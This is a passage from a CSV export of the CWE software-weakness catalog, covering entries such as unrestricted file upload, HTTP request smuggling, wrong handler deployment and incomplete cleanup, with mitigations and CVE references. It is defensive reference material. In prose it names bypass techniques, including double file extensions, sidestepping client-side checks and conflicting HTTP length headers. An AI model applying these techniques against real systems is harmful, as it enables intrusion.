C:.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1185::REFERENCE:CVE-2005-2938:DESCRIPTION:CreateProcess() and CreateProcessAsUser() can be misused by applications to allow program.exe style attacks in C::LINK:https://www.cve.org/CVERecord?id=CVE-2005-2938::REFERENCE:CVE-2000-1128:DESCRIPTION:Applies to Common Files folder, with a malicious common.exe, instead of Program Files/program.exe.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1128::\",::Program Invocation::,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unquoted Search Path or Element::\",,\"::TYPE:Applicable Platform:NOTE:This weakness could apply to any OS that supports spaces in filenames, especially any OS that make it easy for a user to insert spaces into filenames or folders, such as Windows. While spaces are technically supported in Unix, the practice is generally avoided. .::TYPE:Maintenance:NOTE:This weakness primarily involves the lack of quoting, which is not explicitly stated as a part of CWE-116. CWE-116 also describes output in light of structured messages, but the generation of a filename or search path (as in this weakness) might not be considered a structured message. An additional complication is the relationship to control spheres. Unlike untrusted search path (CWE-426), which inherently involves control over the definition of a control sphere, this entry concerns a fixed control sphere in which some part of the sphere may be under attacker control. This is not a clean fit under CWE-668 or CWE-610, which suggests that the control sphere model needs enhancement or clarification.::\",\n430,\"Deployment of Wrong Handler\",Base,Incomplete,\"The wrong handler is assigned to process an object.\",\"An example of deploying the wrong handler would be calling a servlet to reveal source code of a .JSP file, or automatically determining type of the object even if it is contradictory to an explicitly specified type.\",::NATURE:ChildOf:CWE ID:691:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:433:VIEW ID:1000::NATURE:PeerOf:CWE ID:434:VIEW ID:1000::,\"::ORDINALITY:Resultant:DESCRIPTION:This weakness is usually resultant from other weaknesses.::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Varies by Context:IMPACT:Unexpected State::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Perform a type check before interpreting an object.::PHASE:Architecture and Design:DESCRIPTION:Reject any inconsistent types, such as a file with a .GIF extension that appears to consist of PHP code.::\",\"::REFERENCE:CVE-2001-0004:DESCRIPTION:Source code disclosure via manipulated file extension that causes parsing by wrong DLL.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0004::REFERENCE:CVE-2002-0025:DESCRIPTION:Web browser does not properly handle the Content-Type header field, causing a different application to process the document.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0025::REFERENCE:CVE-2000-1052:DESCRIPTION:Source code disclosure by directly invoking a servlet.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1052::REFERENCE:CVE-2002-1742:DESCRIPTION:Arbitrary Perl functions can be loaded by calling a non-existent function that activates a handler.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1742::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Improper Handler Deployment::\",::11::,\"\",\n431,\"Missing Handler\",Base,Draft,\"A handler is not available or implemented.\",\"When an exception is thrown and not caught, the process has given up an opportunity to decide if a given failure or event is worth a change in execution.\",::NATURE:ChildOf:CWE ID:691:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:433:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Handle all possible situations (e.g. error condition).::PHASE:Implementation:DESCRIPTION:If an operation can throw an Exception, implement a handler for that specific exception.::\",\"::REFERENCE:CVE-2022-25302:DESCRIPTION:SDK for OPC Unified Architecture (OPC UA) is missing a handler for when a cast fails, allowing for a crash:LINK:https://www.cve.org/CVERecord?id=CVE-2022-25302::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Missing Handler::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"\",\n434,\"Unrestricted Upload of File with Dangerous Type\",Base,Draft,\"The product allows the upload or transfer of dangerous file types that are automatically processed within its environment.\",\"\",::NATURE:ChildOf:CWE ID:669:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:669:VIEW ID:1003:ORDINAL:Primary::NATURE:PeerOf:CWE ID:351:VIEW ID:1000::NATURE:PeerOf:CWE ID:436:VIEW ID:1000::NATURE:PeerOf:CWE ID:430:VIEW ID:1000::,\"::ORDINALITY:Primary:DESCRIPTION:This can be primary when there is no check for the file type at all.::ORDINALITY:Resultant:DESCRIPTION:This can be resultant when use of double extensions (e.g. .php.gif) bypasses a check.::ORDINALITY:Resultant:DESCRIPTION:This can be resultant from client-side enforcement (CWE-602); some products will include web script in web clients to check the filename, without verifying on the server side.::\",::LANGUAGE NAME:ASP.NET:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Often::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Web Server:TECHNOLOGY PREVALENCE:Sometimes::,\"\",\"::TERM:Unrestricted File Upload:DESCRIPTION:Used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue.::\",\"::PHASE:Implementation::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for web-server extensions such as .asp and .php because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system.::\",\"::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Generate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all.[REF-422] [REF-423]::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Architecture and Design:DESCRIPTION:Consider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically. [REF-423]::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.::PHASE:Architecture and Design:DESCRIPTION:Define a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before allowing .html or .htm file types.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Ensure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that filename.php.gif is fed to the PHP interpreter.[REF-422] [REF-423]::PHASE:Implementation:DESCRIPTION:When running on a web server that supports case-insensitive filenames, perform case-insensitive evaluations of the extensions that are provided.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:DESCRIPTION:Do not rely exclusively on sanity checks of file contents to ensure that the file is of the expected type and size. It may be possible for an attacker to hide code in some file segments that will still be executed by the server. For example, GIF images may contain a free-form comments field.::PHASE:Implementation:DESCRIPTION:Do not rely exclusively on the MIME content type or filename attribute when determining how to render a file. Validating the MIME content type and ensuring that it matches the extension is only a partial solution.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::\",\"::REFERENCE:CVE-2023-5227:DESCRIPTION:PHP-based FAQ management app does not check the MIME type for uploaded images:LINK:https://www.cve.org/CVERecord?id=CVE-2023-5227::REFERENCE:CVE-2001-0901:DESCRIPTION:Web-based mail product stores .shtml attachments that could contain SSI:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0901::REFERENCE:CVE-2002-1841:DESCRIPTION:PHP upload does not restrict file types:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1841::REFERENCE:CVE-2005-1868:DESCRIPTION:upload and execution of .php file:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1868::REFERENCE:CVE-2005-1881:DESCRIPTION:upload file with dangerous extension:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1881::REFERENCE:CVE-2005-0254:DESCRIPTION:program does not restrict file types:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0254::REFERENCE:CVE-2004-2262:DESCRIPTION:improper type checking of uploaded files:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2262::REFERENCE:CVE-2006-4558:DESCRIPTION:Double php extension leaves an active php extension in the generated filename.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4558::REFERENCE:CVE-2006-6994:DESCRIPTION:ASP program allows upload of .asp files by bypassing client-side checks:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6994::REFERENCE:CVE-2005-3288:DESCRIPTION:ASP file upload:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3288::REFERENCE:CVE-2006-2428:DESCRIPTION:ASP file upload:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2428::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unrestricted File Upload::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A3:ENTRY NAME:Malicious File Execution:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-434::\",::1::,\"::TYPE:Relationship:NOTE:This can have a chaining relationship with incomplete denylist / permissive allowlist errors when the product tries, but fails, to properly limit which types of files are allowed (CWE-183, CWE-184). This can also overlap multiple interpretation errors for intermediaries, e.g. anti-virus products that do not remove or quarantine attachments with certain file extensions that can be processed by client systems.::\",\n437,\"Incomplete Model of Endpoint Features\",Base,Incomplete,\"A product acts as an intermediary or monitor between two or more endpoints, but it does not have a complete model of an endpoint's features, behaviors, or state, potentially causing the product to perform incorrect actions based on this incomplete model.\",\"\",::NATURE:ChildOf:CWE ID:436:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Unexpected State:IMPACT:Varies by Context::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Extra Unhandled Features::\",,\"::TYPE:Relationship:NOTE:This can be related to interaction errors, although in some cases, one of the endpoints is not performing correctly according to specification.::\",\n439,\"Behavioral Change in New Version or Environment\",Base,Draft,\"A's behavior or functionality changes with a new version of A, or a new environment, which is not known (or manageable) by B.\",\"\",::NATURE:ChildOf:CWE ID:435:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Functional change::\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"\",\"\",\"::REFERENCE:CVE-2002-1976:DESCRIPTION:Linux kernel 2.2 and above allow promiscuous mode using a different method than previous versions, and ifconfig is not aware of the new method (alternate path property).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1976::REFERENCE:CVE-2005-1711:DESCRIPTION:Product uses defunct method from another product that does not return an error code and allows detection avoidance.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1711::REFERENCE:CVE-2003-0411:DESCRIPTION:chain: Code was ported from a case-sensitive Unix platform to a case-insensitive Windows platform where filetype handlers treat .jsp and .JSP as different extensions. JSP source code may be read because .JSP defaults to the filetype text.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0411::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:CHANGE Behavioral Change::\",,\"\",\n440,\"Expected Behavior Violation\",Base,Draft,\"A feature, API, or function does not perform according to its specification.\",\"\",::NATURE:ChildOf:CWE ID:684:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"\",\"\",\"::REFERENCE:CVE-2003-0187:DESCRIPTION:Program uses large timeouts on unconfirmed connections resulting from inconsistency in linked lists implementations.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0187::REFERENCE:CVE-2003-0465:DESCRIPTION:strncpy in Linux kernel acts different than libc on x86, leading to expected behavior difference - sort of a multiple interpretation error?:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0465::REFERENCE:CVE-2005-3265:DESCRIPTION:Buffer overflow in product stems the use of a third party library function that is expected to have internal protection against overflows, but doesn't.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3265::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Expected behavior violation::\",,\"::TYPE:Theoretical:NOTE:The behavior of an application that is not consistent with the expectations of the developer may lead to incorrect use of the software.::\",\n444,\"Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\",Base,Incomplete,\"The product acts as an intermediary HTTP agent (such as a proxy or firewall) in the data flow between two entities such as a client and server, but it does not interpret malformed HTTP requests or responses in ways that are consistent with how the messages will be processed by those entities that are at the ultimate destination.\",\"HTTP requests or responses (messages) can be malformed or unexpected in ways that cause web servers or clients to interpret the messages in different ways than intermediary HTTP agents such as load balancers, reverse proxies, web caching proxies, application firewalls, etc. For example, an adversary may be able to add duplicate or different header fields that a client or server might interpret as one set of messages, whereas the intermediary might interpret the same sequence of bytes as a different set of messages. For example, discrepancies can arise in how to handle duplicate headers like two Transfer-encoding (TE) or two Content-length (CL), or the malicious HTTP message will have different headers for TE and CL. The inconsistent parsing and interpretation of messages can allow the adversary to smuggle a message to the client/server without the intermediary being aware of it. This weakness is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.\",::NATURE:ChildOf:CWE ID:436:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:436:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:HTTP Request Smuggling::TERM:HTTP Response Smuggling::TERM:HTTP Smuggling::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Non-Repudiation:SCOPE:Access Control:IMPACT:Unexpected State:IMPACT:Hide Activities:IMPACT:Bypass Protection Mechanism:NOTE:An attacker could create HTTP messages to exploit a number of weaknesses including 1) the message can trick the web server to associate a URL with another URL's webpage and caching the contents of the webpage (web cache poisoning attack), 2) the message can be structured to bypass the firewall protection mechanisms and gain unauthorized access to a web application, and 3) the message can invoke a script or a page that returns client credentials (similar to a Cross Site Scripting attack).::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Use a web server that employs a strict HTTP parsing procedure, such as Apache [REF-433].::PHASE:Implementation:DESCRIPTION:Use only SSL communication.::PHASE:Implementation:DESCRIPTION:Terminate the client session after each request.::PHASE:System Configuration:DESCRIPTION:Turn all pages to non-cacheable.::\",\"::REFERENCE:CVE-2022-24766:DESCRIPTION:SSL/TLS-capable proxy allows HTTP smuggling when used in tandem with HTTP/1.0 services, due to inconsistent interpretation and input sanitization of HTTP messages within the body of another message:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24766::REFERENCE:CVE-2021-37147:DESCRIPTION:Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an LF line ending:LINK:https://www.cve.org/CVERecord?id=CVE-2021-37147::REFERENCE:CVE-2020-8287:DESCRIPTION:Node.js platform allows request smuggling via two Transfer-Encoding headers:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8287::REFERENCE:CVE-2006-6276:DESCRIPTION:Web servers allow request smuggling via inconsistent HTTP headers.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6276::REFERENCE:CVE-2005-2088:DESCRIPTION:HTTP server allows request smuggling with both a Transfer-Encoding: chunked header and a Content-Length header:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2088::REFERENCE:CVE-2005-2089:DESCRIPTION:HTTP server allows request smuggling with both a Transfer-Encoding: chunked header and a Content-Length header:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2089::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:HTTP Request Smuggling::TAXONOMY NAME:WASC:ENTRY ID:26:ENTRY NAME:HTTP Request Smuggling::TAXONOMY NAME:WASC:ENTRY ID:27:ENTRY NAME:HTTP Response Smuggling::\",::273::33::,\"::TYPE:Theoretical:NOTE:Request smuggling can be performed due to a multiple interpretation error, where the target is an intermediary or monitor, via a consistency manipulation (Transfer-Encoding and Content-Length headers).::\",\n447,\"Unimplemented or Unsupported Feature in UI\",Base,Draft,\"A UI function for a security feature appears to be supported and gives feedback to the user that suggests that it is supported, but the underlying functionality is not implemented.\",\"\",::NATURE:ChildOf:CWE ID:446:VIEW ID:1000::NATURE:ChildOf:CWE ID:671:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Testing:DESCRIPTION:Perform functionality testing before deploying the application.::\",\"::REFERENCE:CVE-2000-0127:DESCRIPTION:GUI configuration tool does not enable a security option when a checkbox is selected, although that option is honored when manually set in the configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0127::REFERENCE:CVE-2001-0863:DESCRIPTION:Router does not implement a specific keyword when it is used in an ACL, allowing filter bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0863::REFERENCE:CVE-2001-0865:DESCRIPTION:Router does not implement a specific keyword when it is used in an ACL, allowing filter bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0865::REFERENCE:CVE-2004-0979:DESCRIPTION:Web browser does not properly modify security setting when the user sets it.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0979::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unimplemented or unsupported feature in UI::\",,\"::TYPE:Research Gap:NOTE:This issue needs more study, as there are not many examples. It is not clear whether it is primary or resultant.::\",\n448,\"Obsolete Feature in UI\",Base,Draft,\"A UI function is obsolete and the product does not warn the user.\",\"\",::NATURE:ChildOf:CWE ID:446:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Remove the obsolete feature from the UI. Warn the user that the feature is no longer supported.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Obsolete feature in UI::\",,\"\",\n449,\"The UI Performs the Wrong Action\",Base,Incomplete,\"The UI performs the wrong action with respect to the user's request.\",\"\",::NATURE:ChildOf:CWE ID:446:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"\",\"::PHASE:Testing:DESCRIPTION:Perform extensive functionality testing of the UI. The UI should behave as specified.::\",\"::REFERENCE:CVE-2001-1387:DESCRIPTION:Network firewall accidentally implements one command line option as if it were another, possibly leading to behavioral infoleak.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1387::REFERENCE:CVE-2001-0081:DESCRIPTION:Command line option correctly suppresses a user prompt but does not properly disable a feature, although when the product prompts the user, the feature is properly disabled.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0081::REFERENCE:CVE-2002-1977:DESCRIPTION:Product does not time out according to user specification, leaving sensitive data available after it has expired.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1977::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:The UI performs the wrong action::\",,\"\",\n454,\"External Initialization of Trusted Variables or Data Stores\",Base,Draft,\"The product initializes critical internal variables or data stores using inputs that can be modified by untrusted actors.\",\"A product system should be reluctant to trust variables that have been initialized outside of its trust boundary, especially if they are initialized by users. The variables may have been initialized incorrectly. If an attacker can initialize the variable, then they can influence what the vulnerable system will do.\",::NATURE:ChildOf:CWE ID:1419:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:456:VIEW ID:1000::,\"\",::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Sometimes::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:An attacker could gain access to and modify sensitive data or system information.::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:A product system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking (e.g. input validation) is performed when relying on input from outside a trust boundary.::PHASE:Architecture and Design:DESCRIPTION:Avoid any external control of variables. If necessary, restrict the variables that can be modified using an allowlist, and use a different namespace or naming convention if possible.::\",\"::REFERENCE:CVE-2022-43468:DESCRIPTION:WordPress module sets internal variables based on external inputs, allowing false reporting of the number of views:LINK:https://www.cve.org/CVERecord?id=CVE-2022-43468::REFERENCE:CVE-2000-0959:DESCRIPTION:Does not clear dangerous environment variables, enabling symlink attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0959::REFERENCE:CVE-2001-0033:DESCRIPTION:Specify alternate configuration directory in environment variable, enabling untrusted path.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0033::REFERENCE:CVE-2001-0872:DESCRIPTION:Dangerous environment variable not cleansed.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0872::REFERENCE:CVE-2001-0084:DESCRIPTION:Specify arbitrary modules using environment variable.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0084::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:External initialization of trusted variables or values::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP25:ENTRY NAME:Tainted input to variable::\",,\"::TYPE:Relationship:NOTE:Overlaps Missing variable initialization, especially in PHP.::TYPE:Applicable Platform:NOTE:This is often found in PHP due to register_globals and the common practice of storing library/include files under the web document root so that they are available using a direct request.::\",\n455,\"Non-exit on Failed Initialization\",Base,Draft,\"The product does not exit or otherwise modify its operation when security-relevant errors occur during initialization, such as when a configuration file has a format error or a hardware security module (HSM) cannot be activated, which can cause the product to execute in a less secure fashion than intended by the administrator.\",\"\",::NATURE:ChildOf:CWE ID:665:VIEW ID:1000::NATURE:ChildOf:CWE ID:705:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:636:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Alter Execution Logic:NOTE:The application could be placed in an insecure state that may allow an attacker to modify sensitive data or allow unintended logic to be executed.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Follow the principle of failing securely when an error occurs. The system should enter a state where it is not vulnerable and will not display sensitive error messages to a potential attacker.::\",\"::REFERENCE:CVE-2005-1345:DESCRIPTION:Product does not trigger a fatal error if missing or invalid ACLs are in a configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1345::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Non-exit on Failed Initialization::\",,\"::TYPE:Research Gap:NOTE:Under-studied. These issues are not frequently reported, and it is difficult to find published examples.::\",\n459,\"Incomplete Cleanup\",Base,Draft,\"The product does not properly clean up and remove temporary or supporting resources after they have been used.\",\"\",::NATURE:ChildOf:CWE ID:404:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:404:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Insufficient Cleanup::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Other:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:DoS: Resource Consumption (Other):NOTE:It is possible to overflow the number of temporary files because directories typically have limits on the number of files allowed. This could create a denial of service problem.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Temporary files and other supporting resources should be deleted/released immediately after they are no longer needed.::\",\"::REFERENCE:CVE-2000-0552:DESCRIPTION:World-readable temporary file not deleted after use.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0552::REFERENCE:CVE-2005-2293:DESCRIPTION:Temporary file not deleted after use, leaking database usernames and passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2293::REFERENCE:CVE-2002-0788:DESCRIPTION:Interaction error creates a temporary file that can not be deleted due to strong permissions.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0788::REFERENCE:CVE-2002-2066:DESCRIPTION:Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2066::REFERENCE:CVE-2002-2067:DESCRIPTION:Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2067::REFERENCE:CVE-2002-2068:DESCRIPTION:Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2068::REFERENCE:CVE-2002-2069:DESCRIPTION:Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2069::REFERENCE:CVE-2002-2070:DESCRIPTION:Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2070::REFERENCE:CVE-2005-1744:DESCRIPTION:Users not logged out when application is restarted after security-relevant changes were 